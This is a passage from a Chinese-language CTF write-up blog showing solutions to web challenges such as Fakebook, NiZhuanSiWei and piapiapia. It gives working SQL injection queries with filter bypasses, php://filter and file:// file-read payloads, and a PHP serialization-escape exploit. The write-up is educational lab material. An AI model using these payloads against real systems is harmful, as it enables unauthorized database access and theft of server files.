class="string">&#x27;S:&#x27;</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($a);</span><br><span class="line"><span class="comment"># PD9waHAgJGZsYWc9J2ZsYWd7ZDg2ZWRiMjMtNzk0Zi00NDI4LTllNTQtZmQ2NDk2YmNmMjBlfSc7Cg==</span></span><br></pre></td></tr></table></figure>

<p>在 php 7.1+ 环境中，对属性类型不敏感，也可以使用 public 属性来绕过。</p>
<h4 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h4><p>注册一个账号，点进去能看见自己的资料和博客内容。同时发现no=1，尝试注入。</p>
<p>sqlmap告诉我它可以注，但是没跑出来，手注。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">no</span>=<span class="number">1</span>&#x27;  //报错</span><br><span class="line"><span class="attribute">no</span>=<span class="number">1</span> and <span class="number">1</span>=<span class="number">1</span> //正常,sql语句应该是 select ... from ... where id = no</span><br><span class="line"><span class="attribute">no</span>=<span class="number">1</span> order by <span class="number">4</span> //正常</span><br><span class="line"><span class="attribute">no</span>=<span class="number">1</span> order by <span class="number">5</span> //报错，有<span class="number">4</span>列</span><br><span class="line"><span class="attribute">no</span>=<span class="number">0</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> //nohack 有过滤</span><br><span class="line"><span class="attribute">no</span>=<span class="number">0</span>/**/union/**/select/**/<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> //用/**/绕过空格，发现<span class="number">2</span>可以显示，同时知道了网站的绝对路径是/var/www/html</span><br><span class="line"><span class="attribute">no</span>=<span class="number">0</span>/**/union/**/select/**/<span class="number">1</span>,group_concat(schema_name),<span class="number">3</span>,<span class="number">4</span>/**/from/**/information_schema.schemata //查库，发现fakebook</span><br><span class="line"><span class="attribute">no</span>=<span class="number">0</span>/**/union/**/select/**/<span class="number">1</span>,group_concat(table_name),<span class="number">3</span>,<span class="number">4</span>/**/from/**/information_schema.tables/**/where/**/table_schema=%<span class="number">27</span>fakebook%<span class="number">27</span> //查表，得到users</span><br><span class="line"><span class="attribute">no</span>=<span class="number">0</span>/**/union/**/select/**/<span class="number">1</span>,group_concat(column_name),<span class="number">3</span>,<span class="number">4</span>/**/from/**/information_schema.columns/**/where/**/table_name=%<span class="number">27</span>users%<span class="number">27</span> //查列，得到no,username,passwd,data</span><br><span class="line"><span class="attribute">no</span>=<span class="number">0</span>/**/union/**/select/**/<span class="number">1</span>,group_concat(data),<span class="number">3</span>,<span class="number">4</span>/**/from/**/users //得到O:<span class="number">8</span>:<span class="string">&quot;UserInfo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;blog&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;a.com&quot;</span>;&#125;，一个序列化的用户信息</span><br></pre></td></tr></table></figure>

<p>同时有两个信息</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Notice</span>: unserialize(): Error at <span class="keyword">offset</span> <span class="number">0</span> <span class="keyword">of</span> <span class="number">1</span> bytes <span class="keyword">in</span> /var/www/html/<span class="keyword">view</span>.php <span class="keyword">on</span> <span class="type">line</span> <span class="number">31</span></span><br><span class="line">Fatal error: <span class="keyword">Call</span> <span class="keyword">to</span> a member <span class="keyword">function</span> getBlogContents() <span class="keyword">on</span> <span class="type">boolean</span> <span class="keyword">in</span> /var/www/html/<span class="keyword">view</span>.php <span class="keyword">on</span> <span class="type">line</span> <span class="number">67</span></span><br></pre></td></tr></table></figure>

<p>猜测<code>view.php</code>把从数据库中查出的字符串反序列化后执行<code>getBlogContents</code>方法</p>
<p>看一下<code>robots.php</code>，发现有<code>user.php.bak</code>，知道了<code>getBlogContents</code>方法是调用<code>curl_exec</code>，<code>curl_exec</code>可以接受<code>file://</code>协议，于是最终payload</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">no</span>=<span class="number">0</span>/**/union/**/select/**/<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,&#x27;O:<span class="number">8</span>:<span class="string">&quot;UserInfo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">5</span>;s:<span class="number">4</span>:<span class="string">&quot;blog&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>flag在iframe标签里</p>
<h4 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h4><p>第一步绕过text，可以使用<code>data://</code>或者<code>php://input</code>伪协议。第二步用<code>php://filter</code>读取<code>useless.php</code>，<code>http://4a66ab84-c72b-4d9c-bafd-19fab18c72d0.node3.buuoj.cn/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code>，得到Flag类的结构。第三步读取flag.php，序列化一个Flag对象，用<code>php://filter</code>读flag。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">&#125;  </span><br><span class="line">$s = <span class="keyword">new</span> Flag();</span><br><span class="line">$s-&gt;file=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($s);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到<code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;</code></p>
<p>最终payload</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">4</span>a<span class="number">66</span>ab<span class="number">84</span>-c<span class="number">72</span>b-<span class="number">4</span>d<span class="number">9</span>c-bafd-<span class="number">19</span>fab<span class="number">18</span>c<span class="number">72</span>d<span class="number">0</span>.node<span class="number">3</span>.buuoj.cn/?text=php://input&amp;file=useless.php&amp;password=O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">57</span>:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF] 2016 piapiapia"></a>[0CTF] 2016 piapiapia</h4><p>扫一下，发现<a target="_blank" rel="noopener" href="http://www.zip,走一遍正常流程,注册,登录,更新资料,查看资料./">www.zip，走一遍正常流程，注册，登录，更新资料，查看资料。</a></p>
<p>flag在config.php里，目的是要读到config.php，找一下能读文件的位置。</p>
<p>在profile.php找到<code>file_get_contents($profile[&#39;photo&#39;]);</code>，看一下能不能使<code>$profile[&#39;photo&#39;]==’config.php‘</code>，往上面找，profile来源于<code>show_profile()</code>反序列化，再看一下showprofile。</p>
<p>showprofile中，username经过过滤，无法注入（但过滤是很奇怪的），然后从数据库中查询到序列化的字符串，反序列化得到profile，再看看<code>update_profile()</code>。</p>
<p>updateprofile中，把username和newprofile过滤，其中newprofile是序列化后的表单内容，接下来重点看filter。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">	$escape = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">	$escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">	$string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line"></span><br><span class="line">	$safe = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">	$safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进行了转义，如果发现 select, insert, update, delete, where会把它们变成hacker。对于profile来说，已经序列化的字符串长度时固定的，比如<code>s:8:&quot;nickname&quot;;s:5:&quot;where&quot;</code>，如果把where变成hacker，后面就变成<code>s:5:&quot;hacker&quot;</code>，反序列化时最后的引号就逃逸了。于是我们希望利用nickname这项来逃逸字符，使得最后的photo值为config.php。</p>
<p>nickname也有过滤</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(<span class="name">preg_match</span>(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; <span class="number">10</span>)</span><br><span class="line">			die(&#x27;Invalid nickname&#x27;)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>可以用数组绕过。</p>
<p>正常序列化后的profile是 <code>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12312312123&quot;;s:5:&quot;email&quot;;s:12:&quot;aaaaa@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:5:&quot;where&quot;;&#125;s:5:&quot;photo&quot;;s:14:&quot;upload/somemd5&quot;;&#125;</code>，我们希望逃逸出的字符串是<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>，总共是34个字符，因此需要34个where，希望构成<code>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12312312123&quot;;s:5:&quot;email&quot;;s:12:&quot;aaaaa@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; </code>(后面还有一些)，这样where替换成hacker的时候后面的config.php就会赋值给photo</p>
<p>最后的payload，要在burp里面把nickname改成数组，内容是<code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; </code>，在img的src里面能发现base64编码后的config.php，解码得到flag</p>
<h2 id="CG-CTF"><a href="#CG-CTF" class="headerlink" title="CG-CTF"></a>CG-CTF</h2><h3 id="web-3"><a href="#web-3" class="headerlink" title="web"></a>web</h3><h4 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h4><p>一直找iframe标签border那些都是0对应的文件，找到小故事，查看源代码的js文件名可以连成flag</p>
<h4 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h4><p>看出题目是返回一个处理后的字符串，eval改为echo</p>
<h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><p>看robots.txt，应该是要查询id=1024的内容，但是id==1024要得到false，利用intval，可以用1024e1，或者1024.1</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>CTF Writeup</p><p><a href="http://example.com/2019/10/05/writeup/">http://example.com/2019/10/05/writeup/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>lll</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2019-10-05</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2020-10-03</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/CTF/">CTF</a><a class="link-muted mr-2" rel="tag" href="/tags/Writeup/">Writeup</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2019/10/06/metasploit/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Metasploit 笔记</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2019/09/07/powershell/"><span class="level-item">Powershell笔记</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="lll"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">lll</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">42</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">13</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/1klnd" target="_blank" rel="noopener">关注我</a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#new-bugku"><span class="level-left"><span class="level-item">1</span><span class="level-item">new bugku</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#web"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">web</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#web14"><span class="level-left"><span class="level-item">1.1.1</span><span class="level-item">web14</span></span></a></li><li><a class="level is-mobile" href="#web15"><span class="level-left"><span class="level-item">1.1.2</span><span class="level-item">web15</span></span></a></li><li><a class="level is-mobile" href="#web20"><span class="level-left"><span class="level-item">1.1.3</span><span class="level-item">web20</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#安恒月赛"><span class="level-left"><span class="level-item">2</span><span class="level-item">安恒月赛</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#2020-4"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">2020 4</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Ezunserialize"><span class="level-left"><span class="level-item">2.1.1</span><span class="level-item">Ezunserialize</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#攻防世界"><span class="level-left"><span class="level-item">3</span><span class="level-item">攻防世界</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#web-1"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">web</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#baby-web"><span class="level-left"><span class="level-item">3.1.1</span><span class="level-item">baby web</span></span></a></li><li><a class="level is-mobile" href="#php-rce"><span class="level-left"><span class="level-item">3.1.2</span><span class="level-item">php rce</span></span></a></li><li><a class="level is-mobile" href="#web2"><span class="level-left"><span class="level-item">3.1.3</span><span class="level-item">web2</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Reverse"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">Reverse</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#csaw2013reversing2"><span class="level-left"><span class="level-item">3.2.1</span><span class="level-item">csaw2013reversing2</span></span></a></li><li><a class="level is-mobile" href="#dmd-50"><span class="level-left"><span class="level-item">3.2.2</span><span class="level-item">dmd-50</span></span></a></li><li><a class="level is-mobile" href="#re1"><span class="level-left"><span class="level-item">3.2.3</span><span class="level-item">re1</span></span></a></li><li><a class="level is-mobile" href="#game"><span class="level-left"><span class="level-item">3.2.4</span><span class="level-item">game</span></span></a></li><li><a class="level is-mobile" href="#getit"><span class="level-left"><span class="level-item">3.2.5</span><span class="level-item">getit</span></span></a></li><li><a class="level is-mobile" href="#Hello-Ctf"><span class="level-left"><span class="level-item">3.2.6</span><span class="level-item">Hello Ctf</span></span></a></li><li><a class="level is-mobile" href="#Open-Source"><span class="level-left"><span class="level-item">3.2.7</span><span class="level-item">Open Source</span></span></a></li><li><a class="level is-mobile" href="#insanity"><span class="level-left"><span class="level-item">3.2.8</span><span class="level-item">insanity</span></span></a></li><li><a class="level is-mobile" href="#logmein"><span class="level-left"><span class="level-item">3.2.9</span><span class="level-item">logmein</span></span></a></li><li><a class="level is-mobile" href="#maze"><span class="level-left"><span class="level-item">3.2.10</span><span class="level-item">maze</span></span></a></li><li><a class="level is-mobile" href="#no-strings-attached"><span class="level-left"><span class="level-item">3.2.11</span><span class="level-item">no strings attached</span></span></a></li><li><a class="level is-mobile" href="#python-trade"><span class="level-left"><span class="level-item">3.2.12</span><span class="level-item">python trade</span></span></a></li><li><a class="level is-mobile" href="#Shuffle"><span class="level-left"><span class="level-item">3.2.13</span><span class="level-item">Shuffle</span></span></a></li><li><a class="level is-mobile" href="#simple-unpack"><span class="level-left"><span class="level-item">3.2.14</span><span class="level-item">simple unpack</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#BUUCTF"><span class="level-left"><span class="level-item">4</span><span class="level-item">BUUCTF</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#web-2"><span class="level-left"><span class="level-item">4.1</span><span class="level-item">web</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#ACTF2020-新生赛-BackupFile"><span class="level-left"><span class="level-item">4.1.1</span><span class="level-item">[ACTF2020 新生赛]BackupFile</span></span></a></li><li><a class="level is-mobile" href="#ASIS-2019-Unicorn-shop"><span class="level-left"><span class="level-item">4.1.2</span><span class="level-item">[ASIS 2019]Unicorn shop</span></span></a></li><li><a class="level is-mobile" href="#安洵杯-2019-easy-web"><span class="level-left"><span class="level-item">4.1.3</span><span class="level-item">[安洵杯 2019]easy_web</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF-2nd-fake-google"><span class="level-left"><span class="level-item">4.1.4</span><span class="level-item">[BJDCTF 2nd]fake google</span></span></a></li><li><a class="level is-mobile" href="#安洵杯-2019-easy-serialize-php"><span class="level-left"><span class="level-item">4.1.5</span><span class="level-item">[安洵杯 2019]easy_serialize_php</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF2020-EasySearch"><span class="level-left"><span class="level-item">4.1.6</span><span class="level-item">[BJDCTF2020]EasySearch</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF-2nd-Schrödinger"><span class="level-left"><span class="level-item">4.1.7</span><span class="level-item">[BJDCTF 2nd]Schrödinger</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF-2nd-duangShell"><span class="level-left"><span class="level-item">4.1.8</span><span class="level-item">[BJDCTF 2nd]duangShell</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF2020-Cookie-is-so-stable"><span class="level-left"><span class="level-item">4.1.9</span><span class="level-item">[BJDCTF2020]Cookie is so stable</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF2020-ZJCTF，不过如此"><span class="level-left"><span class="level-item">4.1.10</span><span class="level-item">[BJDCTF2020]ZJCTF，不过如此</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF2020-The-mystery-of-ip"><span class="level-left"><span class="level-item">4.1.11</span><span class="level-item">[BJDCTF2020]The mystery of ip</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF-2nd-简单注入"><span class="level-left"><span class="level-item">4.1.12</span><span class="level-item">[BJDCTF 2nd]简单注入</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF2020-Mark-loves-cat"><span class="level-left"><span class="level-item">4.1.13</span><span class="level-item">[BJDCTF2020]Mark loves cat</span></span></a></li><li><a class="level is-mobile" href="#BUUCTF-2018-Online-Tool"><span class="level-left"><span class="level-item">4.1.14</span><span class="level-item">[BUUCTF 2018]Online Tool</span></span></a></li><li><a class="level is-mobile" href="#CISCN2019-总决赛-Day2-Web1-Easyweb"><span class="level-left"><span class="level-item">4.1.15</span><span class="level-item">[CISCN2019 总决赛 Day2 Web1]Easyweb</span></span></a></li><li><a class="level is-mobile" href="#CISCN-2019-初赛-Love-Math"><span class="level-left"><span class="level-item">4.1.16</span><span class="level-item">[CISCN 2019 初赛]Love Math</span></span></a></li><li><a class="level is-mobile" href="#CISCN2019-华北赛区-Day1-Web2-ikun"><span class="level-left"><span class="level-item">4.1.17</span><span class="level-item">[CISCN2019 华北赛区 Day1 Web2]ikun</span></span></a></li><li><a class="level is-mobile" href="#CISCN2019-华北赛区-Day2-Web1-Hack-World"><span class="level-left"><span class="level-item">4.1.18</span><span class="level-item">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></span></a></li><li><a class="level is-mobile" href="#CISCN2019-总决赛-Day2-Web1-Easyweb-1"><span class="level-left"><span class="level-item">4.1.19</span><span class="level-item">[CISCN2019 总决赛 Day2 Web1]Easyweb</span></span></a></li><li><a class="level is-mobile" href="#CISCN2019-华东南赛区-Web11"><span class="level-left"><span class="level-item">4.1.20</span><span class="level-item">[CISCN2019 华东南赛区]Web11</span></span></a></li><li><a class="level is-mobile" href="#CISCN2019-华北赛区-Day1-Web1-Dropbox"><span class="level-left"><span class="level-item">4.1.21</span><span class="level-item">[CISCN2019 华北赛区 Day1 Web1]Dropbox</span></span></a></li><li><a class="level is-mobile" href="#De1CTF-2019-SSRF-Me"><span class="level-left"><span class="level-item">4.1.22</span><span class="level-item">[De1CTF 2019]SSRF Me</span></span></a></li><li><a class="level is-mobile" href="#easy-tornado"><span class="level-left"><span class="level-item">4.1.23</span><span class="level-item">easy tornado</span></span></a></li><li><a class="level is-mobile" href="#GKCTF2020-cve版签到"><span class="level-left"><span class="level-item">4.1.24</span><span class="level-item">[GKCTF2020]cve版签到</span></span></a></li><li><a class="level is-mobile" href="#GKCTF2020-老八小超市儿"><span class="level-left"><span class="level-item">4.1.25</span><span class="level-item">[GKCTF2020]老八小超市儿</span></span></a></li><li><a class="level is-mobile" href="#GKCTF2020-EZ三剑客-EzWeb"><span class="level-left"><span class="level-item">4.1.26</span><span class="level-item">[GKCTF2020]EZ三剑客-EzWeb</span></span></a></li><li><a class="level is-mobile" href="#GKCTF2020-CheckIN"><span class="level-left"><span class="level-item">4.1.27</span><span class="level-item">[GKCTF2020]CheckIN</span></span></a></li><li><a class="level is-mobile" href="#GXYCTF2019-BabyUpload"><span class="level-left"><span class="level-item">4.1.28</span><span class="level-item">[GXYCTF2019]BabyUpload</span></span></a></li><li><a class="level is-mobile" href="#GXYCTF2019-禁止套娃"><span class="level-left"><span class="level-item">4.1.29</span><span class="level-item">[GXYCTF2019]禁止套娃</span></span></a></li><li><a class="level is-mobile" href="#GXYCTF2019-Ping-Ping-Ping"><span class="level-left"><span class="level-item">4.1.30</span><span class="level-item">[GXYCTF2019]Ping Ping Ping</span></span></a></li><li><a class="level is-mobile" href="#GXYCTF2019-BabySQli"><span class="level-left"><span class="level-item">4.1.31</span><span class="level-item">[GXYCTF2019]BabySQli</span></span></a></li><li><a class="level is-mobile" href="#GWCTF-2019-我有一个数据库"><span class="level-left"><span class="level-item">4.1.32</span><span class="level-item">[GWCTF 2019]我有一个数据库</span></span></a></li><li><a class="level is-mobile" href="#GWCTF-2019-枯燥的抽奖"><span class="level-left"><span class="level-item">4.1.33</span><span class="level-item">[GWCTF 2019]枯燥的抽奖</span></span></a></li><li><a class="level is-mobile" href="#GYCTF2020-FlaskApp"><span class="level-left"><span class="level-item">4.1.34</span><span class="level-item">[GYCTF2020]FlaskApp</span></span></a></li><li><a class="level is-mobile" href="#GYCTF2020-Blacklist"><span class="level-left"><span class="level-item">4.1.35</span><span class="level-item">[GYCTF2020]Blacklist</span></span></a></li><li><a class="level is-mobile" href="#HCTF-2018-warmup"><span class="level-left"><span class="level-item">4.1.36</span><span class="level-item">[HCTF] 2018 warmup</span></span></a></li><li><a class="level is-mobile" href="#HCTF-admin"><span class="level-left"><span class="level-item">4.1.37</span><span class="level-item">[HCTF] admin</span></span></a></li><li><a class="level is-mobile" href="#HFCTF2020-EasyLogin"><span class="level-left"><span class="level-item">4.1.38</span><span class="level-item">[HFCTF2020]EasyLogin</span></span></a></li><li><a class="level is-mobile" href="#MRCTF2020-Ez-bypass"><span class="level-left"><span class="level-item">4.1.39</span><span class="level-item">[MRCTF2020]Ez_bypass</span></span></a></li><li><a class="level is-mobile" href="#MRCTF2020-你传你🐎呢"><span class="level-left"><span class="level-item">4.1.40</span><span class="level-item">[MRCTF2020]你传你🐎呢</span></span></a></li><li><a class="level is-mobile" href="#MRCTF2020-PYWebsite"><span class="level-left"><span class="level-item">4.1.41</span><span class="level-item">[MRCTF2020]PYWebsite</span></span></a></li><li><a class="level is-mobile" href="#MRCTF2020-Ezpop"><span class="level-left"><span class="level-item">4.1.42</span><span class="level-item">[MRCTF2020]Ezpop</span></span></a></li><li><a class="level is-mobile" href="#NPUCTF2020-ReadlezPHP"><span class="level-left"><span class="level-item">4.1.43</span><span class="level-item">[NPUCTF2020]ReadlezPHP</span></span></a></li><li><a class="level is-mobile" href="#极客大挑战-2019-PHP"><span class="level-left"><span class="level-item">4.1.44</span><span class="level-item">[极客大挑战 2019]PHP</span></span></a></li><li><a class="level is-mobile" href="#极客大挑战-2019-Http"><span class="level-left"><span class="level-item">4.1.45</span><span class="level-item">[极客大挑战 2019]Http</span></span></a></li><li><a class="level is-mobile" href="#极客大挑战-2019-Knife"><span class="level-left"><span class="level-item">4.1.46</span><span class="level-item">[极客大挑战 2019]Knife</span></span></a></li><li><a class="level is-mobile" href="#极客大挑战-2019-EasySQL"><span class="level-left"><span class="level-item">4.1.47</span><span class="level-item">[极客大挑战 2019]EasySQL</span></span></a></li><li><a class="level is-mobile" href="#极客大挑战-2019-HardSQL"><span class="level-left"><span class="level-item">4.1.48</span><span class="level-item">[极客大挑战 2019]HardSQL</span></span></a></li><li><a class="level is-mobile" href="#极客大挑战-2019-Secret-File"><span class="level-left"><span class="level-item">4.1.49</span><span class="level-item">[极客大挑战 2019]Secret File</span></span></a></li><li><a class="level is-mobile" href="#强网杯-随便注"><span class="level-left"><span class="level-item">4.1.50</span><span class="level-item">[强网杯] 随便注</span></span></a></li><li><a class="level is-mobile" href="#极客大挑战-2019-FinalSQL"><span class="level-left"><span class="level-item">4.1.51</span><span class="level-item">[极客大挑战 2019]FinalSQL</span></span></a></li><li><a class="level is-mobile" href="#RoarCTF-2019-Easy-Java"><span class="level-left"><span class="level-item">4.1.52</span><span class="level-item">[RoarCTF 2019]Easy Java</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF2020-Old-Hack"><span class="level-left"><span class="level-item">4.1.53</span><span class="level-item">[BJDCTF2020]Old Hack</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF2020-Easy-MD5"><span class="level-left"><span class="level-item">4.1.54</span><span class="level-item">[BJDCTF2020]Easy MD5</span></span></a></li><li><a class="level is-mobile" href="#BJDCTF-2nd-假猪套天下第一"><span class="level-left"><span class="level-item">4.1.55</span><span class="level-item">[BJDCTF 2nd]假猪套天下第一</span></span></a></li><li><a class="level is-mobile" href="#RoarCTF-easy-calc"><span class="level-left"><span class="level-item">4.1.56</span><span class="level-item">[RoarCTF] easy calc</span></span></a></li><li><a class="level is-mobile" href="#SUCTF-easy-sql"><span class="level-left"><span class="level-item">4.1.57</span><span class="level-item">[SUCTF] easy sql</span></span></a></li><li><a class="level is-mobile" href="#SUCTF-2019-Pythonginx"><span class="level-left"><span class="level-item">4.1.58</span><span class="level-item">[SUCTF 